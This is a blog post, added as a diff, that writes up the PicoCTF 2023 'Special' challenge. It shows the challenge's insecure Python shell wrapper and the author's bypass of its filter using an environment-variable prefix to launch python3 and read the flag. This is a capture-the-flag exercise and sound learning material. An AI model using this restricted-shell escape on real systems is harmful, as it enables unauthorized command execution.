@@ -1,0 +1,134 @@
+---
+layout: blog_post_layout
+
+title: PicoCTF 2023 - Writeup - Special
+is_blog_post: true
+toc: true
+show_toc: false
+seo_keywords: TODO
+
+post_release_date: 27-06-2023
+post_category: Technical
+
+post_introduction: 
+    I have successfully finished PicoCTF's 2023 Special challenge in the General Skills category. I would normally not 
+    publish something like this, however after reading multiple other writeups (I like to read how others solved it after I'm finished solving the challenges),
+    I feel like my approach was rather special and interesting.
+---
+
+{% include heading.html level="2" text="The challenge" %}
+<pre class="code-wrapper small"><code class="language-bash">AUTHOR: LT 'SYREAL' JONES
+
+Description
+Don't power users get tired of making spelling mistakes in the shell? Not anymore! 
+Enter Special, the Spell Checked Interface for Affecting Linux. 
+Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! 
+Be the first to test Special in beta, and feel free to tell us all about how Special streamlines 
+every development process that you face. When your co-workers see your amazing shell interface, 
+just tell them: That's Special (TM)
+
+Start your instance to see connection details.
+</code></pre>
+
+{% include heading.html level="2" text="My solution" %}
+<p>
+    After <i>A LOT</i> of testing and playing around I found out multiple interesting facts. First of all, you are able to crash the program,
+    if your input is full of empty strings. This results in the following error:
+</p>
+<pre class="code-wrapper small"><code class="language-bash">Special$
+Traceback (most recent call last):
+  File "/usr/local/Special.py", line 34, in <module>
+    first_word = words[0]
+IndexError: list index out of range
+Connection to saturn.picoctf.net closed.
+</code></pre>
+<p>
+    From this error, I gather some useful information. For example, the Special (TM) is located at /usr/local/Special.py.;
+    Hmm, now, I wonder how to get to it... If only I could somehow read the file. Well, after some time I found out that you're able to use env arguments before the commands,
+    so using something like the following <code class="language-bash inline">Placeholder=abc cat /usr/local/Special.py</code> totally works and 
+    outputs the program's source code! Now, there's something to work with. Let's look at the source code.
+</p>
+
+<pre class="code-wrapper large"><code class="language-bash">#!/usr/bin/python3
+
+import os
+from spellchecker import SpellChecker
+
+
+
+spell = SpellChecker()
+
+while True:
+  cmd = input("Special$ ")
+  rval = 0
+
+  if cmd == 'exit':
+    break
+  elif 'sh' in cmd:
+    print('Why go back to an inferior shell?')
+    continue
+  elif cmd[0] == '/':
+    print('Absolutely not paths like that, please!')
+    continue
+
+  # Spellcheck
+  spellcheck_cmd = ''
+  for word in cmd.split():
+    fixed_word = spell.correction(word)
+    if fixed_word is None:
+      fixed_word = word
+    spellcheck_cmd += fixed_word + ' '
+
+  # Capitalize
+  fixed_cmd = list(spellcheck_cmd)
+  words = spellcheck_cmd.split()
+  first_word = words[0]
+  first_letter = first_word[0]
+  if ord(first_letter) >= 97 and ord(first_letter) <= 122:
+    fixed_cmd[0] = chr(ord(spellcheck_cmd[0]) - 0x20)
+  fixed_cmd = ''.join(fixed_cmd)
+
+  try:
+    print(fixed_cmd)
+    os.system(fixed_cmd)
+  except:
+    print("Bad command!")
+</code></pre>
+
+<p>
+    After that, I did some experimenting with the spell checker and capitalization and I think it could lead somewhere 
+    (I even went as far as downloading the version used on the server and trying to brute-force words locally, it's 
+    <a 
+        href="https://pypi.org/project/pyspellchecker/0.7.1/" 
+        class="underline" 
+        {% include external_link.html %}>
+        pyspellchecker v0.7.1 </a>btw :D), but
+    what I wanted ultimately was an RCE exploit and to achieve that, one simply had to look at the top of the file and see that it uses Python.
+    And guess what? I can easily invoke Python from my shell (remember the part where I can invoke any command I wanted by using env variables before commands?)!
+</p>
+<pre class="code-wrapper small"><code class="language-bash">placeholder=abc /usr/bin/python3</code></pre>
+<p>
+    Bam! Just like that I'm able to execute any Python script I desire! At this point, I totally escaped the Special (TM) environment. 
+    All I had to do now, was simply execute the following Python commands to get the flag.
+</p>
+<pre class="code-wrapper medium"><code class="language-python">Special$ placeholder=abc /usr/bin/python3
+Placeholder=abc /usr/bin/python3
+Python 3.8.10 (default, Nov 14 2022, 12:59:47)
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.system("ls")
+blargh
+0
+>>> os.system("ls blargh")
+flag.txt
+0
+>>> os.system("cat blargh/flag.txt")
+picoCTF{I_WILL_NOT_LEAK_THE_FLAG} <---- and here it is :D
+</code></pre>
+<p>
+    Overall I would say that this was one of the most interesting challenges from the picoGym General Skills challenges as of 2023.
+    To be honest, I went through them all and I liked every single one of them, except the ones where you have to learn the Rockstar 
+    programming language. Those were in my opinion tedious and not that interesting. But hey, some people liked them :D, it just wasn't
+    my cup of tea.
+</p>
